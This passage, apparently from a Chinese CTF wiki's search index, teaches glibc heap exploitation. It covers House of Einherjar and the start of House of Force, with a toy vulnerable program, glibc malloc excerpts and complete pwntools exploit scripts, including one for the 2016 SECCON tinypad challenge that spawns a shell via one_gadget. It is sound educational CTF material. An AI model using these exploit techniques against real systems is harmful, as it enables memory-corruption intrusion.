( 0x200 ); \u3000 //\u6784\u9020fake chunk char * s1 = malloc ( 0x18 ); char * s2 = malloc ( 0xf0 ); \u3000 char * s3 = malloc ( 0x20 ); //\u4e3a\u4e86\u4e0d\u8ba9s2\u4e0etop chunk \u5408\u5e76 printf ( \"begin \\n \" ); printf ( \"%p \\n \" , s0 ); printf ( \"input s0 \\n \" ); read ( 0 , s0 , 0x200 ); //\u8bfb\u5165fake chunk printf ( \"input s1 \\n \" ); read ( 0 , s1 , 0x19 ); //Off By One free ( s2 ); return 0 ; } \u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a from pwn import * p = process ( \"./example\" ) context . log_level = 'debug' #gdb.attach(p) p . recvuntil ( \"begin \\n \" ) address = int ( p . recvline () . strip (), 16 ) p . recvuntil ( \"input s0 \\n \" ) payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 ''' p64(address) * 2\u662f\u4e3a\u4e86\u7ed5\u8fc7 if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); ''' payload += p64 ( 0x100 ) #fake size p . sendline ( payload ) p . recvuntil ( \"input s1 \\n \" ) payload = \"A\" * 0x10 + p64 ( 0x220 ) + \" \\x00 \" p . sendline ( payload ) p . recvall () p . close () \u6ce8\u610f\u8fd9\u91cc\u7ed5\u8fc7unlink\u68c0\u67e5\u7684\u65b9\u6cd5\u8ddf\u4e4b\u524d\u5229\u7528unlink\u6f0f\u6d1e\u65f6\u91c7\u7528\u7684\u65b9\u6cd5\u4e0d\u4e00\u6837 \u5229\u7528unlink\u6f0f\u6d1e\u7684\u65f6\u5019\uff1a p -> fd = & p - 3 * 4 p -> bk = & p - 2 * 4 \u5728\u8fd9\u91cc\u5229\u7528\u65f6\uff0c\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u627e\u5230 &p ,\u6240\u4ee5\u76f4\u63a5\u8ba9\uff1a p -> fd = p p -> bk = p \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u4e2a\u70b9\uff1a payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 \u5176\u5b9e\u4fee\u6539\u4e3a\u4e0b\u9762\u8fd9\u6837\u4e5f\u662f\u53ef\u4ee5\u7684: payload = p64 ( 0 ) + p64 ( 0x221 ) + p64 ( address ) * 2 + \"A\" * 0xe0 \u6309\u7167\u9053\u7406\u6765\u8bb2 fake chunk \u7684 size \u662f 0x221 \u624d\u5408\u7406\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48 0x101 \u4e5f\u53ef\u4ee5\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5bf9 size \u548c prev_size \u7684\u9a8c\u8bc1\u53ea\u53d1\u751f\u5728 unlink \u91cc\u9762\uff0c\u800c unlink \u91cc\u9762\u662f\u8fd9\u6837\u9a8c\u8bc1\u7684: if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \u6240\u4ee5\u53ea\u9700\u8981\u518d\u4f2a\u9020 fake chunk \u7684 next chunk \u7684 prev_size \u5b57\u6bb5\u5c31\u597d\u4e86\u3002","title":"\u653b\u51fb\u8fc7\u7a0b\u793a\u4f8b"},{"location":"pwn/heap/house_of_einherjar/#_10","text":"\u8fd9\u91cc\u6211\u4eec\u603b\u7ed3\u4e0b\u8fd9\u4e2a\u5229\u7528\u6280\u672f\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9 \u9700\u8981\u6709\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u5199\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\u7684 prev_size \u4e0e PREV_INUSE \u90e8\u5206\u3002 \u6211\u4eec\u9700\u8981\u8ba1\u7b97\u76ee\u7684 chunk \u4e0e p1 \u5730\u5740\u4e4b\u95f4\u7684\u5dee\uff0c\u6240\u4ee5\u9700\u8981\u6cc4\u6f0f\u5730\u5740\u3002 \u6211\u4eec\u9700\u8981\u5728\u76ee\u7684 chunk \u9644\u8fd1\u6784\u9020\u76f8\u5e94\u7684 fake chunk\uff0c\u4ece\u800c\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002 \u5176\u5b9e\uff0c\u8be5\u6280\u672f\u4e0e chunk extend/shrink \u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\u3002","title":"\u603b\u7ed3"},{"location":"pwn/heap/house_of_einherjar/#2016-seccon-tinypad","text":"","title":"2016 Seccon tinypad"},{"location":"pwn/heap/house_of_einherjar/#_11","text":"\u9996\u5148\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ee5\u6765\u4e00\u4e2a\u6838\u5fc3\u7684\u8bfb\u53d6\u51fd\u6570\uff0c\u5373\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u800c\uff0c\u5f53\u8bfb\u53d6\u7684\u957f\u5ea6\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u957f\u5ea6\u65f6\uff0c\u4f1a\u51fa\u73b0 off by one \u7684\u6f0f\u6d1e \u3002 \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\u64cd\u4f5c\u4e00\u4e2a tinypad\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u64cd\u4f5c \u5f00\u5934\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u5f00\u5934\u4f9d\u6b21\u5224\u65ad\u6bcf\u4e2a memo \u7684\u6307\u9488\u6765\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8fdb\u800c\u5229\u7528 strlen \u6c42\u5f97\u5176\u76f8\u5e94\u7684\u957f\u5ea6\uff0c\u5c06 memo \u7684\u5185\u5bb9\u8f93\u51fa\u3002\u4ece\u8fd9\u91cc\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u6700\u591a\u6709 4 \u4e2a memo\u3002 \u6dfb\u52a0 memo\uff0c\u904d\u5386\u5b58\u50a8 memo \u7684\u53d8\u91cftinypad\uff0c\u6839\u636e tinypad \u7684\u5b58\u50a8\u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u4f7f\u7528\uff0c\u7136\u540e\u8fd8\u6709\u7684\u8bdd\uff0c\u5206\u914d\u4e00\u4e2a memo\u3002\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u7a0b\u5e8f\u53ea\u662f\u4ece tinypad \u8d77\u59cb\u504f\u79fb16*16=256 \u5904\u624d\u5f00\u59cb\u4f7f\u7528\uff0c\u6bcf\u4e2a memo \u5b58\u50a8\u4e24\u4e2a\u5b57\u6bb5\uff0c\u4e00\u4e2a\u662f\u8be5 memo \u7684\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a\u662f\u8be5 memo \u5bf9\u5e94\u7684\u6307\u9488\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ed3\u6784\u4f53\uff0c\u5e76\u4fee\u6539 ida \u8bc6\u522b\u7684 tinypad\uff0c\u4f7f\u4e4b\u66f4\u52a0\u53ef\u8bfb\uff08\u4f46\u662f\u5176\u5b9e ida \u6ca1\u6709\u529e\u6cd5\u5e2e\u5fd9\u667a\u80fd\u8bc6\u522b\u3002\uff09\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u8be5\u6dfb\u52a0\u529f\u80fd\u4f9d\u8d56\u4e8e\u8bfb\u53d6\u51fd\u6570\uff0c\u6240\u4ee5\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7528\u6237\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u6700\u5927\u4e3a 256 \u5b57\u8282\uff0c\u548c tinypad \u524d\u9762\u7684\u672a\u4f7f\u7528\u7684 256 \u5b57\u8282\u6070\u597d\u4e00\u81f4\u3002 \u5220\u9664\uff0c\u6839\u636e\u5b58\u50a8 memo \u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u88ab\u4f7f\u7528\uff0c\u540c\u65f6\u5c06\u76f8\u5e94 memo \u5927\u5c0f\u8bbe\u7f6e\u4e3a0\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u8bbe\u7f6e\u4e3a NULL\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4 Use After Free\u3002 \u5373\u5728\u7a0b\u5e8f\u5f00\u5934\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u8f93\u51fa\u4e00\u4e9b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u6cc4\u6f0f\u4e00\u4e9b\u57fa\u5730\u5740\u7684\u57fa\u7840 \u3002 \u7f16\u8f91\u3002\u5728\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u6839\u636e\u4e4b\u524d\u5b58\u50a8\u7684 memo \u7684\u5185\u5bb9\u5c06\u5176\u62f7\u8d1d\u5230 tinypad \u7684\u524d 256 \u4e2a\u5b57\u8282\u4e2d\uff0c\u4f46\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u5f53 memo \u5b58\u50a8\u4e86 256 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u4f1a\u5b58\u5728 off by one\u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7a0b\u5e8f\u5229\u7528 strlen \u5224\u65ad\u590d\u5236\u4e4b\u540e\u7684 tinypad \u7684\u5185\u5bb9\u957f\u5ea6\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\u4e4b\u540e\u7a0b\u5e8f\u7ee7\u7eed\u5229\u7528 strlen \u6c42\u5f97 memo \u7684\u957f\u5ea6\uff0c\u5e76\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u5230 tinypad \u4e2d\uff0c\u6839\u636e\u8bfb\u53d6\u51fd\u6570\uff0c\u8fd9\u91cc\u5fc5\u7136\u51fa\u73b0\u4e86 \\x00 \u3002\u6700\u540e\u7a0b\u5e8f\u5c06\u8bfb\u53d6\u5230 tinypad \u524d 256 \u5b57\u8282\u7684\u5185\u5bb9\u653e\u5230\u5bf9\u5e94 memo \u4e2d\u3002 \u9000\u51fa","title":"\u57fa\u672c\u529f\u80fd\u5206\u6790"},{"location":"pwn/heap/house_of_einherjar/#_12","text":"\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u5220\u9664\u65f6\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u4e3aNULL\u7684 UAF \u6f0f\u6d1e\uff0c\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740 \u518d\u6b21\u5229\u7528 UAF \u6f0f\u6d1e\u6cc4\u6f0f libc \u7684\u57fa\u5730\u5740\u3002 \u5229\u7528 house of einherjar \u65b9\u6cd5\u5728 tinypad \u7684\u524d 256 \u5b57\u8282\u4e2d\u4f2a\u9020 chunk\u3002\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u65f6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u63a7\u52364\u4e2a memo \u7684\u6307\u9488\u548c\u5185\u5bb9\u4e86\u3002 \u8fd9\u91cc\u867d\u7136\u6211\u4eec\u7684\u7b2c\u4e00\u60f3\u6cd5\u53ef\u80fd\u662f\u76f4\u63a5\u8986\u76d6 malloc_hook \u4e3a one_gadget \u5730\u5740\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u5f53\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u662f\u5229\u7528 strlen \u6765\u5224\u8bfb\u53ef\u4ee5\u8bfb\u53d6\u591a\u5c11\u957f\u5ea6\uff0c\u800c malloc_hook \u5219\u5728\u521d\u59cb\u65f6\u4e3a 0\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8986\u76d6\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u5373\u4fee\u6539\u7a0b\u5e8f\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget\uff0c\u4e4b\u6240\u4ee5\u53ef\u4ee5\u884c\u5f97\u901a\uff0c\u662f\u56e0\u4e3a\u8fd4\u56de\u5730\u5740\u5f80\u5f80\u662f 7f \u5f00\u5934\u7684\uff0c\u957f\u5ea6\u8db3\u591f\u957f\uff0c\u53ef\u4ee5\u8986\u76d6\u4e3aone_gadget\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u9700\u8981\u6cc4\u6f0f main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u7531\u4e8e libc \u4e2d\u5b58\u50a8\u4e86 main \u51fd\u6570 environ \u6307\u9488\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5148\u6cc4\u9732\u51faenviron \u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u5f97\u77e5\u5b58\u50a8 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\u8fd9\u91cc\u9009\u53d6 environ \u7b26\u53f7\u662f\u56e0\u4e3a environ \u7b26\u53f7\u5728 libc \u4e2d\u4f1a\u5bfc\u51fa\uff0c\u800c\u50cf argc \u548c argv \u5219\u4e0d\u4f1a\u5bfc\u51fa\uff0c\u76f8\u5bf9\u6765\u8bf4\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u4e00\u70b9\u3002 \u6700\u540e\u4fee\u6539 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u5730\u5740\u83b7\u53d6shell\u3002 \u5177\u4f53\u5229\u7528\u811a\u672c\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' tinypad = ELF ( \"./tinypad\" ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) libc = ELF ( './libc.so.6' ) else : p = process ( \"./tinypad\" ) libc = ELF ( './libc.so.6' ) main_arena_offset = 0x3c4b20 log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) def add ( size , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'a' ) p . recvuntil ( '(SIZE)>>> ' ) p . sendline ( str ( size )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) def edit ( idx , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'e' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) p . recvuntil ( 'Is it OK? \\n ' ) p . sendline ( 'Y' ) def delete ( idx ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'd' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) def run (): p . recvuntil ( ' ============================================================================ \\n\\n ' ) # 1. leak heap base add ( 0x70 , 'a' * 8 ) # idx 0 add ( 0x70 , 'b' * 8 ) # idx 1 add ( 0x100 , 'c' * 8 ) # idx 2 delete ( 2 ) # delete idx 1 delete ( 1 ) # delete idx 0, idx 0 point to idx 1 p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) # get pointer point to idx1 heap_base = u64 ( data . ljust ( 8 , ' \\x00 ' )) - 0x80 log . success ( 'get heap base: ' + hex ( heap_base )) # 2. leak libc base # this will trigger malloc_consolidate # first idx0 will go to unsorted bin # second idx1 will merge with idx0(unlink), and point to idx0 # third idx1 will merge into top chunk # but cause unlink feture, the idx0's fd and bk won't change # so idx0 will leak the unsorted bin addr delete ( 3 ) p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) unsorted_offset_arena = 8 + 10 * 8 main_arena = u64 ( data . ljust ( 8 , ' \\x00 ' )) - unsorted_offset_arena libc_base = main_arena - main_arena_offset log . success ( 'main arena addr: ' + hex ( main_arena )) log . success ( 'libc base addr: ' + hex ( libc_base )) # 3. house of einherjar add ( 0x18 , 'a' * 0x18 ) # idx 0 # we would like trigger house of einherjar at idx 1 add ( 0x100 , 'b' * 0xf8 + ' \\x11 ' ) # idx 1 add ( 0x100 , 'c' * 0xf8 ) # idx 2 add ( 0x100 , 'd' * 0xf8 ) #idx 3 # create a fake chunk in tinypad's 0x100 buffer, offset 0x20 tinypad_addr = 0x602040 fakechunk_addr = tinypad_addr + 0x20 fakechunk_size = 0x101 fakechunk = p64 ( 0 ) + p64 ( fakechunk_size ) + p64 ( fakechunk_addr ) + p64 ( fakechunk_addr ) edit ( 3 , 'd' * 0x20 + fakechunk ) # overwrite idx 1's prev_size and # set minaddr of size to '\\x00' # idx 0's chunk size is 0x20 diff = heap_base + 0x20 - fakechunk_addr log . info ( 'diff between idx1 and fakechunk: ' + hex ( diff )) # '\\0' padding caused by strcpy diff_strip = p64 ( diff ) . strip ( ' \\0 ' ) number_of_zeros = len ( p64 ( diff )) - len ( diff_strip ) for i in range ( number_of_zeros + 1 ): data = diff_strip . rjust ( 0x18 - i , 'f' ) edit ( 1 , data ) delete ( 2 ) p . recvuntil ( ' \\n Deleted.' ) # fix the fake chunk size, fd and bk # fd and bk must be unsorted bin edit ( 4 , 'd' * 0x20 + p64 ( 0 ) + p64 ( 0x101 ) + p64 ( main_arena + 88 ) + p64 ( main_arena + 88 )) # 3. overwrite malloc_hook with one_gadget one_gadget_addr = libc_base + 0x45216 environ_pointer = libc_base + libc . symbols [ '__environ' ] log . info ( 'one gadget addr: ' + hex ( one_gadget_addr )) log . info ( 'environ pointer addr: ' + hex ( environ_pointer )) #fake_malloc_chunk = main_arena - 60 + 9 # set memo[0].size = 'a'*8, # set memo[0].content point to environ to leak environ addr fake_pad = 'f' * ( 0x100 - 0x20 - 0x10 ) + 'a' * 8 + p64 ( environ_pointer ) + 'a' * 8 + p64 ( 0x602148 ) # get a fake chunk add ( 0x100 - 8 , fake_pad ) # idx 2 #gdb.attach(p) # get environ addr p . recvuntil ( ' # CONTENT: ' ) environ_addr = p . recvuntil ( ' \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) environ_addr = u64 ( environ_addr ) main_ret_addr = environ_addr - 30 * 8 # set memo[0].content point to main_ret_addr edit ( 2 , p64 ( main_ret_addr )) # overwrite main_ret_addr with one_gadget addr edit ( 1 , p64 ( one_gadget_addr )) p . interactive () if __name__ == \"__main__\" : run ()","title":"\u5229\u7528"},{"location":"pwn/heap/house_of_einherjar/#_13","text":"https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606 https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf https://bbs.pediy.com/thread-226119.htm","title":"\u53c2\u8003\u6587\u732e"},{"location":"pwn/heap/house_of_force/","text":"House Of Force \u00b6 \u4ecb\u7ecd \u00b6 House Of Force \u5c5e\u4e8e House Of XXX \u7cfb\u5217\u7684\u5229\u7528\u65b9\u6cd5\uff0cHouse Of XXX \u662f 2004 \u5e74\u300aThe Malloc Maleficarum-Glibc Malloc Exploitation Techniques\u300b\u4e2d\u63d0\u51fa\u7684\u4e00\u7cfb\u5217\u9488\u5bf9 glibc \u5806\u5206\u914d\u5668\u7684\u5229\u7528\u65b9\u6cd5\u3002 \u4f46\u662f\uff0c\u7531\u4e8e\u5e74\u4ee3\u4e45\u8fdc\u300aThe Malloc Maleficarum\u300b\u4e2d\u63d0\u51fa\u7684\u5927\u591a\u6570\u65b9\u6cd5\u4eca\u5929\u90fd\u4e0d\u80fd\u594f\u6548\uff0c\u6211\u4eec\u73b0\u5728\u6240\u6307\u7684 House Of XXX \u5229\u7528\u76f8\u6bd4 2004 \u5e74\u6587\u7ae0\u4e2d\u5199\u7684\u5df2\u6709\u8f83\u5927\u7684\u4e0d\u540c\u3002\u4f46\u662f\u300aThe Malloc Maleficarum\u300b\u4f9d\u7136\u662f\u4e00\u7bc7\u63a8\u8350\u9605\u8bfb\u7684\u6587\u7ae0\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bfb\u5230\u5b83\u7684\u539f\u6587\uff1a https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt \u539f\u7406 \u00b6 House Of Force \u662f\u4e00\u79cd\u5806\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u8bf4 House Of Force \u5fc5\u987b\u5f97\u57fa\u4e8e\u5806\u6f0f\u6d1e\u6765\u8fdb\u884c\u5229\u7528\u3002\u5982\u679c\u4e00\u4e2a\u5806(heap based) \u6f0f\u6d1e\u60f3\u8981\u901a\u8fc7 House Of Force \u65b9\u6cd5\u8fdb\u884c\u5229\u7528\uff0c\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6\uff1a \u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df \u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f House Of Force \u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e glibc \u5bf9 top chunk \u7684\u5904\u7406\uff0c\u6839\u636e\u524d\u9762\u5806\u6570\u636e\u7ed3\u6784\u90e8\u5206\u7684\u77e5\u8bc6\u6211\u4eec\u5f97\u77e5\uff0c\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u6240\u6709\u7a7a\u95f2\u7684\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece top chunk \u4e2d\u5206\u5272\u51fa\u76f8\u5e94\u7684\u5927\u5c0f\u4f5c\u4e3a\u5806\u5757\u7684\u7a7a\u95f4\u3002 \u90a3\u4e48\uff0c\u5f53\u4f7f\u7528 top chunk \u5206\u914d\u5806\u5757\u7684 size \u503c\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\u4efb\u610f\u503c\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u7b54\u6848\u662f\uff0c\u53ef\u4ee5\u4f7f\u5f97 top chunk\u6307\u5411\u6211\u4eec\u671f\u671b\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4e00\u6b21\u4efb\u610f\u5730\u5740\u5199\u3002\u7136\u800c\u5728 glibc \u4e2d\uff0c\u4f1a\u5bf9\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u548c top chunk \u73b0\u6709\u7684 size \u8fdb\u884c\u9a8c\u8bc1 // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av->top; size = chunksize(victim); // \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av->top = remainder; set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } \u7136\u800c\uff0c\u5982\u679c\u53ef\u4ee5\u7be1\u6539 size \u4e3a\u4e00\u4e2a\u5f88\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u901a\u8fc7\u8fd9\u4e2a\u9a8c\u8bc1\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u8bf4\u7684\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u63a7\u5236top chunk size \u57df\u7684\u6f0f\u6d1e\u3002 (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) \u4e00\u822c\u7684\u505a\u6cd5\u662f\u628a top chunk \u7684 size \u6539\u4e3a-1\uff0c\u56e0\u4e3a\u5728\u8fdb\u884c\u6bd4\u8f83\u65f6\u4f1a\u628a size \u8f6c\u6362\u6210\u65e0\u7b26\u53f7\u6570\uff0c\u56e0\u6b64 -1 \u4e5f\u5c31\u662f\u8bf4unsigned long \u4e2d\u6700\u5927\u7684\u6570\uff0c\u6240\u4ee5\u65e0\u8bba\u5982\u4f55\u90fd\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002 remainder = chunk_at_offset(victim, nb); av->top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u4e4b\u540e\u8fd9\u91cc\u4f1a\u628a top \u6307\u9488\u66f4\u65b0\uff0c\u63a5\u4e0b\u6765\u7684\u5806\u5757\u5c31\u4f1a\u5206\u914d\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7528\u6237\u53ea\u8981\u63a7\u5236\u4e86\u8fd9\u4e2a\u6307\u9488\u5c31\u76f8\u5f53\u4e8e\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c(write-anything-anywhere)\u3002 \u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctopchunk\u7684size\u4e5f\u4f1a\u66f4\u65b0\uff0c\u5176\u66f4\u65b0\u7684\u65b9\u6cd5\u5982\u4e0b victim = av -> top ; size = chunksize ( victim ); remainder_size = size - nb ; set_head ( remainder , remainder_size | PREV_INUSE ); \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e0b\u6b21\u5728\u6307\u5b9a\u4f4d\u7f6e\u5206\u914d\u5927\u5c0f\u4e3a x \u7684 chunk\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd remainder_size \u4e0d\u5c0f\u4e8e x+ MINSIZE\u3002 \u7b80\u5355\u793a\u4f8b1 \u00b6 \u5728\u5b66\u4e60\u5b8c HOF \u7684\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u8bf4\u660e HOF \u7684\u5229\u7528\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u7684\u76ee\u6807\u662f\u901a\u8fc7HOF\u6765\u7be1\u6539 malloc@got.plt \u5b9e\u73b0\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b int main() { long *ptr,*ptr2; ptr=malloc(0x10); ptr=(long *)(((long)ptr)+24); *ptr=-1; // <=== \u8fd9\u91cc\u628atop chunk\u7684size\u57df\u6539\u4e3a0xffffffffffffffff malloc(-4120); // <=== \u51cf\u5c0ftop chunk\u6307\u9488 malloc(0x10); // <=== \u5206\u914d\u5757\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199 } \u9996\u5148\uff0c\u6211\u4eec\u5206\u914d\u4e00\u4e2a 0x10 \u5b57\u8282\u5927\u5c0f\u7684\u5757 0x602000: 0x0000000000000000 0x0000000000000021 <=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk 0x602030: 0x0000000000000000 0x0000000000000000 \u4e4b\u540e\u628a top chunk \u7684 size \u6539\u4e3a 0xffffffffffffffff\uff0c\u5728\u771f\u6b63\u7684\u9898\u76ee\u4e2d\uff0c\u8fd9\u4e00\u6b65\u53ef\u4ee5\u901a\u8fc7\u5806\u6ea2\u51fa\u7b49\u6f0f\u6d1e\u6765\u5b9e\u73b0\u3002 \u56e0\u4e3a -1 \u5728\u8865\u7801\u4e2d\u662f\u4ee5 0xffffffffffffffff \u8868\u793a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8d4b\u503c -1 \u5c31\u53ef\u4ee5\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0xffffffffffffffff <=== top chunk size\u57df\u88ab\u66f4\u6539 0x602030: 0x0000000000000000 0x0000000000000000 \u6ce8\u610f\u6b64\u65f6\u7684 top chunk \u4f4d\u7f6e\uff0c\u5f53\u6211\u4eec\u8fdb\u884c\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u66f4\u6539 top chunk \u7684\u4f4d\u7f6e\u5230\u6211\u4eec\u60f3\u8981\u7684\u5730\u65b9 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 